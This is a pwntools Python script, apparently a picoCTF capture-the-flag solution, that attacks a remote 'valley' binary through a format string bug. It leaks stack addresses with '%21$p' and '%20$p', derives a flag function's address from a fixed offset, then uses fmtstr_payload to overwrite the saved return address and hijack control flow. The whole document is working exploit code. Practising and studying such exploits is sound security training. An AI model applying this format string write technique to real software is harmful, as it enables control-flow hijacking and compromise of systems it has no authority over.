from pwn import *


# %21$p 

# gef➤  print(0x555555555413-0x0000555555555269)
#$1 = 0x1aa > 426

elf = context.binary = ELF("./valley")
#p = elf.process()
p = remote("shape-facility.picoctf.net", 64258)

def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    p.sendline(b"exit")  
    try:
        l = p.recvuntil(b"The Valley Disappears", timeout=2)  
    except EOFError:
        l = b""  
    p.close()
    return l

offset = FmtStr(send_payload).offset  
# info("offset = %d", offset)

p.recvuntil("Try Shouting: \n")
p.sendline(b"%21$p")

leak_address_flag = int(p.recvline().split(b" ")[5], 16)

print("[+] Leaked address: ", hex(leak_address_flag))
#leak_address = int(p.recvline().strip(), 16)

flagf_addr = leak_address_flag - 426
print("[+] Leaked flag function address: ", hex(flagf_addr))


#p.recvuntill(b"0x12345: ")
#win_addr_hex = hex(win_addr)

#p.recvuntil(b"0x12345: ")
#p.sendline(win_addr_hex)

#l = p.recvall()

#p.recvuntil("Try Shouting: \n")
p.sendline(b"%20$p")

#leak_address_libc = int(p.recvline().split(b" ")[5], 16)
leak_address_ret = int(p.recvline().split(b" ")[5],16)

#print(hex(leak_address_libc))
print("[+] Leaked return near address: ", hex(leak_address_ret))
#leak_address = int(p.recvline().strip(), 16)

ret_addr = leak_address_ret - 8 # 171368  #  160330
print("[+] Leaked ret address: ", hex(ret_addr))


libc_file = ELF("./libc.so.6")
#libc_file.address = libc_addr

flag_func = flagf_addr
#flag_func = elf.symbols['print_flag']
#printf_addr = elf.got['puts']
writes = {ret_addr: flagf_addr}


payload = fmtstr_payload(8, writes)

p.sendline(payload)
print(payload)

p.sendline(b"exit")


l = p.recvall()
print(l)
